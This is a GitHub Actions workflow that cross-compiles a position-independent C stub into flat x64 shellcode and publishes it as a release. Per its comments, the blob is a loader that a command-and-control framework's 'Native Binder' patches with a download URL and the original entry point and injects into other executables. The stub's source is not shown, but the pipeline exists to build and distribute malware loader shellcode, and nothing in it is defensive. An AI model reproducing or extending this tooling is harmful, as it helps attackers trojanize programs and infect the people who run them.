name: Release

# Compiles the position-independent C stub to a flat shellcode blob and publishes
# it to a GitHub Release. C2's "Native Binder" downloads this and patches the URL +
# original-OEP RVA into it at bind time.
#
#   - push to main / manual  -> (re)creates the rolling `preview` release
#   - push of a v* tag        -> creates a versioned release
on:
  push:
    branches: [main]
    tags: ["v*"]
  workflow_dispatch:

permissions:
  contents: write   # gh release create / delete

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Install mingw-w64 (x86_64)
        run: sudo apt-get update && sudo apt-get install -y gcc-mingw-w64-x86-64

      - name: Compile stub (freestanding, position-independent)
        run: |
          x86_64-w64-mingw32-gcc -c -O2 -ffreestanding -nostdlib -fno-stack-protector \
                -e _start stub/stub.c -o stub.o

      - name: Relocations (should be PC-relative only — verifies PIC)
        run: x86_64-w64-mingw32-objdump -r stub.o || true

      - name: Link to flat PIC binary
        run: |
          mkdir -p dist
          x86_64-w64-mingw32-ld -T stub/stub.ld --entry=_start -o stub.pe stub.o
          x86_64-w64-mingw32-objcopy -O binary stub.pe dist/stub-x64.bin
          ls -la dist
          # The binder patcher locates these markers in the flat binary — there must be exactly one of each.
          test "$(grep -a -c SHELLCODE_URL_PLACEHOLDER dist/stub-x64.bin)" = "1" || { echo "FAIL: URL marker missing/duplicated"; exit 1; }
          test "$(grep -a -c C2OEPRAV dist/stub-x64.bin)" = "1" || { echo "FAIL: OEP marker missing/duplicated"; exit 1; }

      - uses: actions/upload-artifact@v4
        with:
          name: stub-x64
          path: dist/stub-x64.bin

  publish:
    needs: build
    runs-on: ubuntu-latest
    steps:
      - uses: actions/download-artifact@v4
        with:
          name: stub-x64
          path: dist

      - name: Publish release
        env:
          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          ls -la dist
          if [[ "$GITHUB_REF" == refs/tags/* ]]; then
            TAG="${GITHUB_REF#refs/tags/}"
            gh release create "$TAG" dist/* --title "$TAG" --notes "Native loader stub $TAG" --repo "$GITHUB_REPOSITORY"
          else
            gh release delete preview --cleanup-tag --yes --repo "$GITHUB_REPOSITORY" 2>/dev/null || true
            gh release create preview dist/* --title "Preview" --prerelease --target "$GITHUB_SHA" \
              --notes "Rolling build of the native loader stub ($GITHUB_SHA)." --repo "$GITHUB_REPOSITORY"
          fi
